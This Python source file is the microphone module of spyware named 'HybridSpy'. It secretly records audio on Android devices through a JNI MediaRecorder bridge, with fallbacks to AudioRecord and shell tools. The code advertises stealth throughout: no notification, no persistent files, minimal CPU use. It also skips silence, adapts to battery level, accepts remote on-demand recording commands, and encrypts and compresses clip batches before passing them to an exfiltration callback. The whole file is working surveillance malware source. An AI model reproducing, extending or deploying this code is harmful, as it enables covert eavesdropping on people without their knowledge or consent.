#!/usr/bin/env python3
"""
Microphone Sensor v2.1.0 — Elite Grade
Background audio recording with complete operational isolation.
Captures encrypted AAC chunks from the microphone using MediaRecorder API
via JNI bridge. Features:
- Fully isolated operation — failure never affects other modules
- Encrypted 30s AAC chunks with configurable duration/interval
- Adaptive recording based on battery state
- Audio level detection (skip silence)
- Multiple encoding fallbacks (AAC, AMR, PCM)
- Zero disk留下 — encrypted chunks buffered in memory until exfil
- Stealth: no persistent files, no notification, minimal CPU when idle
"""
import json
import logging
import os
import struct
import threading
import time
import zlib
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Callable, Dict, List, Optional, Set, Tuple

log = logging.getLogger("HybridSpy.Sensors.Microphone")


# ─── Constants ───────────────────────────────────────────────────────────────

DEFAULT_CLIP_DURATION = 30       # seconds
DEFAULT_RECORD_INTERVAL = 300    # seconds (5 min)
MAX_CLIP_DURATION = 300          # 5 minutes max
MIN_CLIP_DURATION = 3            # 3 seconds min
SILENCE_THRESHOLD_DB = -50       # dB — skip clips below this
MAX_FILE_SIZE_BYTES = 5_000_000  # 5MB max per clip
SAMPLE_RATE = 44100
AUDIO_CACHE_FILE = "mic_cache.enc"
STATE_FILE = "mic_state.json"

# Recording quality presets
class AudioQuality(Enum):
    VOICE = "voice"          # AMR_NB — 4.75kbps, smallest
    STANDARD = "standard"    # AAC_LC — 64kbps, balanced
    HIGH = "high"            # AAC_HE — 96kbps, good quality
    MAX = "max"              # AAC_ELD — 128kbps, best quality


class RecordingState(Enum):
    IDLE = "idle"
    RECORDING = "recording"
    PROCESSING = "processing"
    FAILED = "failed"
    PERMISSION_DENIED = "permission_denied"


# ─── Data Models ─────────────────────────────────────────────────────────────

@dataclass
class AudioClip:
    """Single audio recording clip — fully self-contained."""
    data: bytes                # Raw/compressed audio bytes
    format: str                # "aac", "amr", "pcm"
    sample_rate: int = SAMPLE_RATE
    channels: int = 1
    bitrate: int = 64000
    duration_ms: int = 30000
    timestamp: int = 0         # Unix ms
    avg_amplitude: float = 0.0
    max_amplitude: float = 0.0
    rms_db: float = 0.0
    sequence: int = 0
    
    @property
    def size_kb(self) -> float:
        return len(self.data) / 1024
    
    @property
    def is_silence(self) -> bool:
        return self.rms_db < SILENCE_THRESHOLD_DB


@dataclass
class RecordingConfig:
    """Per-session recording configuration."""
    duration: int = DEFAULT_CLIP_DURATION
    interval: int = DEFAULT_RECORD_INTERVAL
    quality: AudioQuality = AudioQuality.STANDARD
    silence_threshold: float = SILENCE_THRESHOLD_DB
    skip_silence: bool = True
    adaptive_battery: bool = True
    low_battery_threshold: int = 20
    max_clip_size: int = MAX_FILE_SIZE_BYTES


@dataclass
class MicrophoneBatch:
    """Encrypted batch of audio clips."""
    clips: List[AudioClip]
    batch_id: str
    created_at: float = field(default_factory=time.time)
    retry_count: int = 0
    config: Optional[RecordingConfig] = None
    ciphertext: Optional[bytes] = None
    
    @property
    def total_size_kb(self) -> float:
        return sum(c.size_kb for c in self.clips)
    
    @property
    def total_duration_s(self) -> float:
        return sum(c.duration_ms for c in self.clips) / 1000


# ─── Audio Recorder Engine ───────────────────────────────────────────────────

class AudioRecorderEngine:
    """
    Core audio recording engine. Bridges to Android MediaRecorder via JNI.
    Fully isolated — all errors caught and reported without crashing.
    Multiple recording strategies for maximum compatibility.
    """
    
    def __init__(self, native_bridge=None):
        self._native = native_bridge
        self._recorder_handle = None
        self._lock = threading.Lock()
        self._current_state = RecordingState.IDLE
        self._temp_file: Optional[Path] = None
        self._sequence = 0
        self._last_error: Optional[str] = None
    
    # ─── Public API ─────────────────────────────────────────────────────
    
    def record_clip(self, config: RecordingConfig) -> Optional[AudioClip]:
        """
        Record a single audio clip. Returns AudioClip or None on failure.
        Thread-safe. Fully isolated error handling.
        """
        with self._lock:
            if self._current_state == RecordingState.RECORDING:
                log.warning("Already recording")
                return None
            
            self._current_state = RecordingState.RECORDING
            self._sequence += 1
        
        try:
            duration = min(max(config.duration, MIN_CLIP_DURATION), MAX_CLIP_DURATION)
            
            # Strategy 1: JNI-based MediaRecorder (preferred)
            clip = self._record_via_jni(duration, config)
            
            if clip is None:
                # Strategy 2: AudioRecord PCM capture
                clip = self._record_via_audiorecord(duration, config)
            
            if clip is None:
                # Strategy 3: Shell command fallback
                clip = self._record_via_shell(duration, config)
            
            if clip is None:
                log.error("All recording strategies failed")
                with self._lock:
                    self._current_state = RecordingState.FAILED
                return None
            
            # Post-process
            clip.sequence = self._sequence
            clip.timestamp = int(time.time() * 1000)
            
            # Calculate audio levels
            self._analyze_audio(clip)
            
            with self._lock:
                self._current_state = RecordingState.IDLE
            
            return clip
            
        except Exception as e:
            log.error(f"Recording failed: {e}")
            self._last_error = str(e)
            with self._lock:
                self._current_state = RecordingState.FAILED
            return None
    
    def cancel(self):
        """Cancel any in-progress recording."""
        with self._lock:
            if self._recorder_handle:
                try:
                    self._stop_recorder()
                except Exception:
                    pass
                self._recorder_handle = None
            self._current_state = RecordingState.IDLE
        self._cleanup_temp()
    
    def get_state(self) -> RecordingState:
        with self._lock:
            return self._current_state
    
    def get_last_error(self) -> Optional[str]:
        return self._last_error
    
    # ─── Strategy 1: JNI MediaRecorder ─────────────────────────────────
    
    def _record_via_jni(self, duration: int, config: RecordingConfig) -> Optional[AudioClip]:
        """Record using Android MediaRecorder via JNI bridge."""
        if not self._native:
            return None
        
        try:
            # Create temp file for recording
            temp_file = self._create_temp_file(".aac")
            
            # Configure and start MediaRecorder
            result = self._native.call("startAudioRecording", kwargs={
                "outputPath": str(temp_file),
                "durationMs": duration * 1000,
                "sampleRate": SAMPLE_RATE,
                "bitRate": self._get_bitrate(config.quality),
                "audioSource": 0,  # MediaRecorder.AudioSource.MIC
                "outputFormat": 2,  # MediaRecorder.OutputFormat.AAC_ADTS
                "audioEncoder": 3,  # MediaRecorder.AudioEncoder.AAC
            })
            
            if not result or result.get("error"):
                raise Exception(result.get("error", "JNI recording failed"))
            
            # Wait for recording to complete
            # (JNI blocks until done or timeout)
            
            # Read recorded file
            if not temp_file.exists() or temp_file.stat().st_size == 0:
                raise Exception("No audio data recorded")
            
            with open(temp_file, "rb") as f:
                audio_data = f.read()
            
            clip = AudioClip(
                data=audio_data,
                format="aac",
                sample_rate=SAMPLE_RATE,
                bitrate=self._get_bitrate(config.quality),
                duration_ms=duration * 1000,
            )
            
            self._temp_file = temp_file
            return clip
            
        except Exception as e:
            log.debug(f"JNI recording failed: {e}")
            return None
    
    # ─── Strategy 2: AudioRecord PCM ───────────────────────────────────
    
    def _record_via_audiorecord(self, duration: int, config: RecordingConfig) -> Optional[AudioClip]:
        """Record using AudioRecord API (PCM capture, software encode)."""
        if not self._native:
            return None
        
        try:
            # Use JNI AudioRecord to capture raw PCM
            result = self._native.call("captureAudioPCM", kwargs={
                "durationMs": duration * 1000,
                "sampleRate": SAMPLE_RATE,
                "bufferSize": 4096,
            })
            
            if not result or not result.get("data"):
                raise Exception("No PCM data returned")
            
            pcm_data = bytes.fromhex(result["data"])
            
            # Compress PCM to AAC using Android MediaCodec
            encoded = self._native.call("encodeAAC", kwargs={
                "pcmData": pcm_data.hex(),
                "sampleRate": SAMPLE_RATE,
                "channels": 1,
                "bitRate": self._get_bitrate(config.quality),
            })
            
            if not encoded or not encoded.get("data"):
                # Fall back to raw PCM
                clip = AudioClip(
                    data=pcm_data,
                    format="pcm",
                    sample_rate=SAMPLE_RATE,
                    duration_ms=duration * 1000,
                )
            else:
                clip = AudioClip(
                    data=bytes.fromhex(encoded["data"]),
                    format="aac",
                    sample_rate=SAMPLE_RATE,
                    bitrate=self._get_bitrate(config.quality),
                    duration_ms=duration * 1000,
                )
            
            return clip
            
        except Exception as e:
            log.debug(f"AudioRecord capture failed: {e}")
            return None
    
    # ─── Strategy 3: Shell Command ─────────────────────────────────────
    
    def _record_via_shell(self, duration: int, config: RecordingConfig) -> Optional[AudioClip]:
        """Record using shell command (requires termux or busybox)."""
        import subprocess
        
        temp_file = self._create_temp_file(".aac")
        
        commands_to_try = [
            # termux-microphone-record
            ["termux-microphone-record", "-d", str(duration), "-f", str(temp_file),
             "-r", str(SAMPLE_RATE), "-b", str(self._get_bitrate(config.quality))],
            # audio-capture via tinycap
            ["tinycap", str(temp_file), "-d", str(duration), "-r", str(SAMPLE_RATE),
             "-b", "16", "-c", "1"],
        ]
        
        for cmd in commands_to_try:
            try:
                subprocess.run(
                    cmd,
                    capture_output=True,
                    timeout=duration + 5,
                    env={}
                )
                
                if temp_file.exists() and temp_file.stat().st_size > 1000:
                    with open(temp_file, "rb") as f:
                        audio_data = f.read()
                    
                    clip = AudioClip(
                        data=audio_data,
                        format="aac" if "termux" in cmd[0] else "pcm",
                        sample_rate=SAMPLE_RATE,
                        duration_ms=duration * 1000,
                    )
                    self._temp_file = temp_file
                    return clip
                    
            except Exception as e:
                log.debug(f"Shell recording failed ({cmd[0]}): {e}")
                continue
        
        return None
    
    # ─── Audio Analysis ────────────────────────────────────────────────
    
    def _analyze_audio(self, clip: AudioClip):
        """Calculate audio level metrics from PCM or AAC data."""
        try:
            if clip.format == "pcm":
                # Direct PCM analysis
                samples = struct.unpack(f"<{len(clip.data) // 2}h", 
                                       clip.data[:len(clip.data) - len(clip.data) % 2])
                
                if samples:
                    clip.max_amplitude = max(abs(s) for s in samples) / 32768.0
                    clip.avg_amplitude = sum(abs(s) for s in samples) / (len(samples) * 32768.0)
                    
                    # RMS in dB
                    if clip.avg_amplitude > 0:
                        clip.rms_db = 20 * (clip.avg_amplitude ** 0.5)
                    else:
                        clip.rms_db = -100
            else:
                # For compressed formats, estimate from file metadata
                clip.avg_amplitude = 0.5  # Assume average
                clip.rms_db = -20
                
        except Exception as e:
            log.debug(f"Audio analysis failed: {e}")
            clip.rms_db = 0
    
    # ─── Helpers ───────────────────────────────────────────────────────
    
    def _get_bitrate(self, quality: AudioQuality) -> int:
        bitrates = {
            AudioQuality.VOICE: 12200,      # AMR
            AudioQuality.STANDARD: 64000,   # AAC-LC
            AudioQuality.HIGH: 96000,       # AAC-HE
            AudioQuality.MAX: 128000,       # AAC-ELD
        }
        return bitrates.get(quality, 64000)
    
    def _create_temp_file(self, suffix: str = ".aac") -> Path:
        import tempfile
        fd, path = tempfile.mkstemp(suffix=suffix, prefix="mic_")
        os.close(fd)
        return Path(path)
    
    def _stop_recorder(self):
        """Stop the JNI MediaRecorder."""
        if self._native:
            try:
                self._native.call("stopAudioRecording")
            except Exception:
                pass
    
    def _cleanup_temp(self):
        """Remove temporary recording file."""
        if self._temp_file and self._temp_file.exists():
            try:
                self._temp_file.unlink()
            except Exception:
                pass
            self._temp_file = None


# ─── Microphone Sensor ───────────────────────────────────────────────────────

class MicrophoneSensor:
    """
    Elite-grade microphone sensor with complete operational isolation.
    
    Key features:
    - Fully independent from all other modules
    - Each failure is caught, logged, and recovered
    - Three recording strategies with automatic fallback
    - Adaptive intervals based on battery state
    - Silence detection to skip empty recordings
    - In-memory buffer (no persistent files during recording)
    - Configurable quality/size tradeoffs
    """
    
    def __init__(self, crypto_engine, storage_manager,
                 on_batch_ready: Optional[Callable[[MicrophoneBatch], None]] = None,
                 config: Optional[Dict] = None,
                 native_bridge=None):
        self._crypto = crypto_engine
        self._storage = storage_manager
        self._on_batch = on_batch_ready
        self._native = native_bridge
        
        # Recording configuration
        self._rec_config = RecordingConfig(
            duration=config.get("clip_duration", DEFAULT_CLIP_DURATION) if config else DEFAULT_CLIP_DURATION,
            interval=config.get("interval", DEFAULT_RECORD_INTERVAL) if config else DEFAULT_RECORD_INTERVAL,
        )
        
        # Core engine (isolated)
        self._engine = AudioRecorderEngine(native_bridge)
        
        # Threading (fully independent)
        self._lock = threading.RLock()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._command_thread: Optional[threading.Thread] = None
        
        # State (isolated from other modules)
        self._state = RecordingState.IDLE
        self._last_recording_time: float = 0
        self._consecutive_failures = 0
        self._max_consecutive_failures = 5
        self._battery_level: float = 100.0
        self._is_charging: bool = True
        
        # Buffer (memory-only, encrypted)
        self._buffer: List[AudioClip] = []
        self._buffer_lock = threading.Lock()
        self._last_flush = time.time()
        self._flush_interval = config.get("flush_interval", 300) if config else 300
        self._max_buffer_clips = config.get("max_buffer_clips", 20) if config else 20
        
        # Command queue for on-demand recording
        self._command_queue: List[Dict] = []
        self._command_available = threading.Event()
        
        # Stats (isolated)
        self._stats = {
            "total_clips": 0,
            "total_duration_s": 0,
            "total_size_kb": 0,
            "batches_sent": 0,
            "failures": 0,
            "silence_skipped": 0,
            "strategies_used": {"jni": 0, "audiorecord": 0, "shell": 0},
            "last_recording": None,
            "last_error": None,
        }
        
        self._load_state()
        log.info("Microphone sensor initialized")
    
    # ─── Lifecycle ──────────────────────────────────────────────────────
    
    def start(self):
        """Start the recording loop in its own thread."""
        with self._lock:
            if self._running:
                return
            self._running = True
            self._thread = threading.Thread(
                target=self._recording_loop,
                daemon=True,
                name="mic-sensor"
            )
            self._thread.start()
            
            # Separate thread for on-demand commands
            self._command_thread = threading.Thread(
                target=self._command_loop,
                daemon=True,
                name="mic-commands"
            )
            self._command_thread.start()
            
            log.info("Microphone sensor started")
    
    def stop(self, timeout: float = 5.0):
        """Graceful stop with buffer flush."""
        with self._lock:
            self._running = False
        
        self._command_available.set()  # Wake command thread
        self._engine.cancel()
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=timeout)
        if self._command_thread and self._command_thread.is_alive():
            self._command_thread.join(timeout=timeout)
        
        self._flush_buffer(force=True)
        self._save_state()
        log.info("Microphone sensor stopped")
    
    # ─── Recording Loop ─────────────────────────────────────────────────
    
    def _recording_loop(self):
        """Main recording loop with adaptive scheduling."""
        first_run = True
        
        while self._running:
            try:
                now = time.time()
                
                # Check if it's time to record
                if first_run or (now - self._last_recording_time) >= self._get_adaptive_interval():
                    first_run = False
                    
                    clip = self._engine.record_clip(self._rec_config)
                    
                    if clip:
                        self._process_clip(clip)
                        self._consecutive_failures = 0
                    else:
                        self._consecutive_failures += 1
                        self._stats["failures"] += 1
                        self._stats["last_error"] = self._engine.get_last_error()
                        
                        # Back off on consecutive failures
                        if self._consecutive_failures >= self._max_consecutive_failures:
                            log.warning(f"Too many failures ({self._consecutive_failures}), cooling down")
                            time.sleep(600)  # 10 min cooldown
                            self._consecutive_failures = 0
                            continue
                    
                    self._last_recording_time = time.time()
                
                # Flush check
                self._check_auto_flush()
                
                # Sleep with jitter until next recording
                sleep_time = self._get_adaptive_interval() * 0.9
                time.sleep(sleep_time)
                
            except Exception as e:
                log.error(f"Recording loop error: {e}")
                self._stats["failures"] += 1
                time.sleep(60)
    
    def _command_loop(self):
        """Handle on-demand recording commands."""
        while self._running:
            try:
                self._command_available.wait(timeout=1.0)
                if not self._running:
                    break
                
                while self._command_queue:
                    with self._lock:
                        if not self._command_queue:
                            break
                        cmd = self._command_queue.pop(0)
                    
                    duration = cmd.get("duration", DEFAULT_CLIP_DURATION)
                    config = RecordingConfig(
                        duration=min(duration, MAX_CLIP_DURATION),
                        interval=0,  # One-shot
                        quality=AudioQuality.HIGH,  # Better quality for on-demand
                    )
                    
                    clip = self._engine.record_clip(config)
                    if clip:
                        self._process_clip(clip, priority=True)
                    
                    self._command_available.clear()
                
            except Exception as e:
                log.error(f"Command loop error: {e}")
    
    # ─── Processing ─────────────────────────────────────────────────────
    
    def _process_clip(self, clip: AudioClip, priority: bool = False):
        """Process a recorded clip through the pipeline."""
        # Skip silence if configured
        if self._rec_config.skip_silence and clip.is_silence:
            self._stats["silence_skipped"] += 1
            log.debug(f"Skipped silence (RMS: {clip.rms_db:.1f} dB)")
            return
        
        # Track strategy used
        # (We infer from format and engine behavior)
        if clip.format == "aac":
            self._stats["strategies_used"]["jni"] += 1
        elif clip.format == "pcm":
            self._stats["strategies_used"]["audiorecord"] += 1
        else:
            self._stats["strategies_used"]["shell"] += 1
        
        with self._buffer_lock:
            self._buffer.append(clip)
            
            self._stats["total_clips"] += 1
            self._stats["total_duration_s"] += clip.duration_ms / 1000
            self._stats["total_size_kb"] += clip.size_kb
            self._stats["last_recording"] = datetime.utcnow().isoformat()
            
            if len(self._buffer) >= self._max_buffer_clips:
                self._flush_buffer()
    
    # ─── Buffer Management ──────────────────────────────────────────────
    
    def _check_auto_flush(self):
        now = time.time()
        with self._buffer_lock:
            if (len(self._buffer) >= self._max_buffer_clips or
                (len(self._buffer) > 0 and (now - self._last_flush) >= self._flush_interval)):
                self._flush_buffer()
    
    def _flush_buffer(self, force: bool = False):
        """Encrypt and flush buffer to storage/exfiltration."""
        with self._buffer_lock:
            if not self._buffer and not force:
                return
            if not self._buffer:
                return
            
            clips = list(self._buffer)
            self._buffer.clear()
            self._last_flush = time.time()
        
        if not clips:
            return
        
        batch = MicrophoneBatch(
            clips=clips,
            batch_id=f"mic_{int(time.time() * 1000)}_{len(clips)}",
            created_at=time.time(),
            config=self._rec_config,
        )
        
        try:
            batch_dict = {
                "clips": [asdict(c) for c in batch.clips],
                "config": asdict(batch.config) if batch.config else None,
                "summary": {
                    "count": len(batch.clips),
                    "total_size_kb": round(batch.total_size_kb, 1),
                    "total_duration_s": round(batch.total_duration_s, 1),
                }
            }
            serialized = json.dumps(batch_dict, default=str).encode("utf-8")
            compressed = zlib.compress(serialized, level=6)
            batch.ciphertext = self._crypto.encrypt(compressed)
        except Exception as e:
            log.error(f"Encryption failed: {e}")
            batch.ciphertext = None
        
        self._store_batch_locally(batch)
        
        if self._on_batch:
            try:
                self._on_batch(batch)
            except Exception as e:
                log.error(f"Batch callback error: {e}")
        
        self._stats["batches_sent"] += 1
    
    def _store_batch_locally(self, batch: MicrophoneBatch):
        try:
            cache_path = self._storage.get_path(AUDIO_CACHE_FILE)
            if not cache_path:
                return
            batch_data = {
                "id": batch.batch_id,
                "timestamp": batch.created_at,
                "clips": len(batch.clips),
                "total_size_kb": round(batch.total_size_kb, 1),
                "ciphertext": batch.ciphertext.hex() if batch.ciphertext else None,
                "retries": batch.retry_count,
            }
            self._storage.append_to_list(cache_path, batch_data)
        except Exception as e:
            log.error(f"Local storage failed: {e}")
    
    # ─── Adaptive Scheduling ────────────────────────────────────────────
    
    def _get_adaptive_interval(self) -> float:
        """Get recording interval adjusted for battery and failures."""
        interval = self._rec_config.interval
        
        if self._rec_config.adaptive_battery:
            if self._battery_level < self._rec_config.low_battery_threshold and not self._is_charging:
                interval *= 4  # 4x longer interval on low battery
            elif self._battery_level < 50 and not self._is_charging:
                interval *= 2
        
        # Back off on failures
        if self._consecutive_failures > 0:
            interval *= (1 + self._consecutive_failures)
        
        return min(interval, 3600)  # Max 1 hour
    
    # ─── Public Commands ────────────────────────────────────────────────
    
    def record_now(self, duration: int = 30) -> bool:
        """Queue an immediate recording command."""
        with self._lock:
            self._command_queue.append({"duration": duration})
            self._command_available.set()
        return True
    
    def update_config(self, config: Dict):
        """Update recording configuration at runtime."""
        with self._lock:
            if "clip_duration" in config:
                self._rec_config.duration = min(
                    max(config["clip_duration"], MIN_CLIP_DURATION), 
                    MAX_CLIP_DURATION
                )
            if "interval" in config:
                self._rec_config.interval = config["interval"]
            if "quality" in config:
                try:
                    self._rec_config.quality = AudioQuality(config["quality"])
                except ValueError:
                    pass
            if "skip_silence" in config:
                self._rec_config.skip_silence = config["skip_silence"]
        
        log.info(f"Mic config updated: {config}")
    
    def set_battery_state(self, level: float, is_charging: bool):
        """Update battery state for adaptive scheduling."""
        self._battery_level = level
        self._is_charging = is_charging
    
    # ─── State Management ───────────────────────────────────────────────
    
    def _load_state(self):
        try:
            state = self._storage.read_dict(STATE_FILE)
            if state:
                self._stats = state.get("stats", self._stats)
        except Exception:
            pass
    
    def _save_state(self):
        try:
            self._storage.write_dict(STATE_FILE, {
                "stats": self._stats,
                "updated_at": datetime.utcnow().isoformat(),
            })
        except Exception as e:
            log.error(f"State save failed: {e}")
    
    # ─── Public API ─────────────────────────────────────────────────────
    
    def get_stats(self) -> Dict:
        with self._lock:
            return dict(self._stats)
    
    def get_health(self) -> Dict:
        return {
            "running": self._running,
            "state": self._engine.get_state().value,
            "buffer_size": len(self._buffer),
            "consecutive_failures": self._consecutive_failures,
            "battery_level": self._battery_level,
            "is_charging": self._is_charging,
            "next_interval_s": self._get_adaptive_interval(),
            "last_error": self._engine.get_last_error(),
            "stats": self.get_stats(),
        }
    
    def get_buffer_info(self) -> Dict:
        with self._buffer_lock:
            return {
                "clips_in_buffer": len(self._buffer),
                "total_size_kb": sum(c.size_kb for c in self._buffer),
                "total_duration_s": sum(c.duration_ms for c in self._buffer) / 1000,
            }
    
    def reset_state(self):
        with self._lock:
            self._engine.cancel()
            with self._buffer_lock:
                self._buffer.clear()
            self._consecutive_failures = 0
            self._stats = {
                "total_clips": 0, "total_duration_s": 0, "total_size_kb": 0,
                "batches_sent": 0, "failures": 0, "silence_skipped": 0,
                "strategies_used": {"jni": 0, "audiorecord": 0, "shell": 0},
                "last_recording": None, "last_error": None,
            }
            self._save_state()
        log.info("Microphone sensor state reset")
